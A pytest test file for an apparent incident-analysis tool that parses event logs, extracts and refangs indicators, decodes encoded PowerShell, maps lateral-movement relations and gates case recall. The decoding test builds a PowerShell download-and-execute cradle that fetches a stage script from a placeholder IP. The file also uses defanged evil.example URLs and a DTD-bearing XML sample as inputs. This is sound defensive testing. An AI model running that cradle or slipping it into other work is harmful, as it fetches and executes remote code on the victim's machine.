"""Phase 52: event logs as citable lines, indicators, entities, timelines, recall as context.

All of it deterministic: an event is a line, an indicator is a pattern, a relation is the events
that state it, and recalled cases are context that no mission can see.
"""

from __future__ import annotations

import ast
import base64
from pathlib import Path

import pytest
from httpx import ASGITransport, AsyncClient

from app.api.app import create_app
from app.api.registry import MissionRecord, get_registry
from app.cases.service import get_case_store
from app.core.config import get_settings
from app.cyber.analysis import analyse, decode_powershell
from app.cyber.eventlog import events_from_json, events_from_xml, from_line, to_line
from app.cyber.iocs import extract, refang
from app.cyber.recall import distinctive, similar_cases
from app.evidence import service as evidence_service
from app.schemas.case import Case, CaseEvidence, CaseMode
from app.schemas.common import new_run_id
from app.schemas.objective import Objective
from app.tools.formats import parse

FIXTURES = get_settings().agent_dir / "fixtures" / "documents"
APP = Path(__file__).resolve().parents[2] / "app"


def _documents(*names: str) -> dict[str, str]:
    return {name: parse(FIXTURES / name).text for name in names}


# --- event logs become one event per line ---------------------------------------------------------


def test_a_windows_xml_export_is_one_event_per_line() -> None:
    document = parse(FIXTURES / "cyber_ws12_security.xml")
    assert document.kind == "event_log" and document.line_count == 4
    line = document.text.splitlines()[1]
    assert line.startswith("2026-03-03T09:14:05Z host=WS-12 user=jdoe event=4688 ")
    assert "parent=" in line and "cmd=" in line


def test_json_lines_and_arrays_are_read_alike() -> None:
    record = {
        "timestamp": "2026-03-03T10:20:00Z",
        "host": "SRV-DB",
        "EventID": 4624,
        "LogonType": 3,
    }
    lines = events_from_json(
        '{"timestamp": "2026-03-03T10:20:00Z", "host": "SRV-DB", "EventID": 4624, "LogonType": 3}'
    )
    array = events_from_json("[" + str(record).replace("'", '"') + "]")
    assert lines and array and to_line(lines[0]) == to_line(array[0])
    assert to_line(lines[0]) == "2026-03-03T10:20:00Z host=SRV-DB event=4624 logon_type=3"
    assert events_from_json('{"not": "a list of events"} trailing') is None


def test_an_xml_export_with_a_dtd_is_refused() -> None:
    hostile = '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><Events><Event/></Events>'
    with pytest.raises(ValueError, match="DTD"):
        events_from_xml(hostile)


def test_a_normalised_line_and_a_syslog_line_read_back() -> None:
    event = from_line('2026-03-03T09:14:05Z host=WS-12 user=jdoe event=4688 cmd="whoami /all"')
    assert event is not None and (event.host, event.user, event.event) == ("WS-12", "jdoe", "4688")
    assert event.fields["cmd"] == "whoami /all"
    syslog = from_line("Mar  3 09:05:44 SRV-FILE sshd[911]: Accepted publickey for it_admin")
    assert syslog is not None and syslog.host == "SRV-FILE" and syslog.fields["service"] == "sshd"
    assert from_line("Just a sentence about nothing.") is None


# --- indicators -----------------------------------------------------------------------------------


def test_defanged_indicators_are_refanged() -> None:
    assert refang("hxxp://evil[.]example/a and 10.0.0[.]5 and admin[@]corp.example") == (
        "http://evil.example/a and 10.0.0.5 and admin@corp.example"
    )
    kinds = {(i.kind.value, i.value) for i in extract("hxxps://evil[.]example/x")}
    assert ("url", "https://evil.example/x") in kinds and ("domain", "evil.example") in kinds


@pytest.mark.parametrize(
    ("text", "expected", "absent"),
    [
        ("(New-Object Net.WebClient).DownloadString", set(), {("domain", "net.webclient")}),
        ("started powershell.exe", set(), {("domain", "powershell.exe")}),
        (
            r"C:\Program Files\Microsoft Office\root\WINWORD.EXE",
            {("file_path", r"C:\Program Files\Microsoft Office\root\WINWORD.EXE")},
            set(),
        ),
        (r"rundll32 C:\Windows\Temp\x.dll,Start", {("file_path", r"C:\Windows\Temp\x.dll")}, set()),
        (
            "CVE-2024-3400 on fw01.corp.lan",
            {("cve", "CVE-2024-3400"), ("domain", "fw01.corp.lan")},
            set(),
        ),
        ("sha256 " + "ab" * 32, {("sha256", "ab" * 32)}, {("sha1", "ab" * 20)}),
    ],
)
def test_indicator_rules(
    text: str, expected: set[tuple[str, str]], absent: set[tuple[str, str]]
) -> None:
    found = {(i.kind.value, i.value) for i in extract(text)}
    assert expected <= found
    assert not (absent & found)


# --- decoding, entities, relations, timelines -----------------------------------------------------


def test_encoded_powershell_is_decoded() -> None:
    script = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage.ps1')"
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    assert decode_powershell(f"powershell -NoProfile -enc {encoded}") == script
    assert decode_powershell(f"powershell -EncodedCommand {encoded}") == script
    assert decode_powershell("powershell -enc not!base64!!!!!!!!!") == ""
    assert decode_powershell("powershell Get-Process") == ""


def test_the_powershell_log_shows_its_chain_and_what_it_contacted() -> None:
    analysis = analyse(_documents("cyber_ws12_security.xml"))
    relations = {(r.subject, r.predicate, r.object) for r in analysis.relations}
    assert ("process:winword.exe", "SPAWNED", "process:powershell.exe") in relations
    assert ("host:ws-12", "CONNECTED_TO", "ipv4:203.0.113.50") in relations
    [decoded] = analysis.decoded_commands
    assert decoded.locator == "cyber_ws12_security.xml:r2" and "DownloadString" in decoded.script
    url = next(i for i in analysis.indicators if i.kind == "url")
    assert url.value == "http://203.0.113.50/stage.ps1"
    assert url.via == ["decoded from -EncodedCommand"]
    assert url.sources == ["cyber_ws12_security.xml:r2"], "every indicator cites its line"


def test_lateral_movement_is_remote_logons_and_a_service_install() -> None:
    analysis = analyse(_documents("cyber_lateral_movement.jsonl"))
    relations = {(r.subject, r.predicate, r.object) for r in analysis.relations}
    assert ("account:svc_admin", "LOGGED_ON_REMOTELY", "host:srv-db") in relations
    assert ("account:svc_admin", "LOGGED_ON_REMOTELY", "host:srv-file") in relations
    assert ("service:psexesvc", "INSTALLED_ON", "host:srv-db") in relations
    assert ("process:psexesvc.exe", "SPAWNED", "process:cmd.exe") in relations
    timeline = analysis.account_timelines["svc_admin"]
    assert [t.locator for t in timeline] == [
        f"cyber_lateral_movement.jsonl:r{n}" for n in range(1, 6)
    ]
    assert [t.time for t in timeline] == sorted(t.time for t in timeline)
    assert set(analysis.host_timelines) == {"SRV-DB", "SRV-FILE"}


def test_benign_administration_decodes_nothing_and_names_no_public_address() -> None:
    analysis = analyse(_documents("cyber_admin_benign.log"))
    assert analysis.events == 6
    assert analysis.decoded_commands == []
    assert distinctive(analysis.indicators) == set()


# --- recall: context, never evidence --------------------------------------------------------------


def test_recall_is_reachable_only_from_the_cyber_endpoint() -> None:
    """D19's guarantee, structurally: nothing a mission runs can import the recall."""
    users = []
    for path in APP.rglob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        imported = {
            n.module for n in ast.walk(tree) if isinstance(n, ast.ImportFrom) and n.module
        } | {a.name for n in ast.walk(tree) if isinstance(n, ast.Import) for a in n.names}
        if "app.cyber.recall" in imported:
            users.append(str(path.relative_to(APP)).replace("\\", "/"))
    assert users == ["api/v1/cyber.py"]


async def _cyber_case(title: str, document: str, *, recall: bool = False) -> Case:
    cases = await get_case_store()
    case = await cases.add(
        Case(
            case_id=await cases.next_id(2026),
            title=title,
            mode=CaseMode.CYBER,
            recall_similar=recall,
        )
    )
    locker = await evidence_service.get_locker()
    path = FIXTURES / document
    item = await evidence_service.intake(locker, path, name=document)
    await cases.add_evidence(CaseEvidence(case_id=case.case_id, evidence_id=item.evidence_id))
    return case


async def test_a_case_sharing_a_public_indicator_is_recalled() -> None:
    earlier = await _cyber_case("Earlier PowerShell incident", "cyber_ws12_security.xml")
    current = await _cyber_case("Now", "cyber_lateral_movement.jsonl", recall=True)
    shared = await similar_cases(current.case_id, {"203.0.113.50", "evil.example"})
    assert [(s.case_id, s.shared) for s in shared] == [(earlier.case_id, ["203.0.113.50"])]
    assert await similar_cases(current.case_id, {"10.0.0.12"}) == [], (
        "private addresses say nothing"
    )


async def test_the_endpoint_recalls_only_when_the_case_opted_in() -> None:
    await _cyber_case("Earlier", "cyber_ws12_security.xml")
    opted_out = await _cyber_case("Current", "cyber_ws12_security.xml")
    record = MissionRecord(new_run_id(), Objective(text="What ran on WS-12?"), [])
    record.texts = _documents("cyber_ws12_security.xml")
    record.case_id = opted_out.case_id
    get_registry()._missions[record.run_id] = record

    async with AsyncClient(transport=ASGITransport(app=create_app()), base_url="http://test") as c:
        off = (await c.get(f"/api/v1/missions/{record.run_id}/cyber")).json()
        await c.patch(f"/api/v1/cases/{opted_out.case_id}", json={"recall_similar": True})
        on = (await c.get(f"/api/v1/missions/{record.run_id}/cyber")).json()

    assert off["events"] == 4 and off["similar_cases"] == []
    assert off["recall"].startswith("off: the case has not opted in")
    assert on["recall"].startswith("on: context only")
    assert on["similar_cases"] and "203.0.113.50" in on["similar_cases"][0]["shared"]
